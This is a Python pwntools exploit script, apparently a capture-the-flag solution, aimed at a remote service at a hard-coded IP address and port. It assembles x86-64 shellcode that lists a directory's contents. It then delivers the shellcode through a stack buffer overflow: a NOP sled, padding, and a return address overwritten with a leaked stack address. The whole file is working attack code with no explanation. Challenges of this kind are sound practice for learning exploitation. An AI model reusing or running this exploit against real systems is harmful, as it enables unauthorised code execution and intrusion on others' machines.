from pwn import *

p = remote('193.57.159.27',35316)
#pid= gdb.attach(p,gdbscript='''
#	b * main +103
#	''')

sc = asm("""
	xor rax, rax
	push rax
	push 0x002e

	mov al, 2      
	mov rdi, rsp   
	xor rsi, rsi 
	xor rdx, rdx 
	syscall	

	mov rdi,rax 		
	xor rdx,rdx
	xor rax,rax
	mov dx, 0x3210 	
	sub rsp, rdx 	
	mov rsi, rsp 	
	mov al, 78 	
	syscall

	xchg rax,rdx

	xor rax, rax
	xor rdi,rdi
	
	inc eax
	inc edi
	mov rsi, rsp
	syscall


	xor rax, rax
	mov al, 60
	syscall
    

""",
arch='amd64',
os ='linux'
)
print len(sc)
stack = int(p.recvline().split(' ')[3],16)
a = 80-len(sc)
payload = '\x90' * a
payload += sc
payload += 'aaaaaaaa'
payload += p64(stack)
p.sendlineafter('> ',payload)

p.interactive()

